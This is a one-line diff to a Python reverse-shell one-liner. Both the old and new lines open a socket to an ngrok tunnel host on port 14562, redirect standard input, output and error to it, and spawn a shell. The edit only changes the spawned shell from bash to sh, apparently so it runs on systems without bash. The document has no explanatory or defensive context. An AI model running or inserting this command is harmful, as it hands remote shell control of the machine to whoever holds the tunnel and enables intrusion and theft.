@@ -1,1 +1,1 @@
-python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io",14562));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io",14562));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
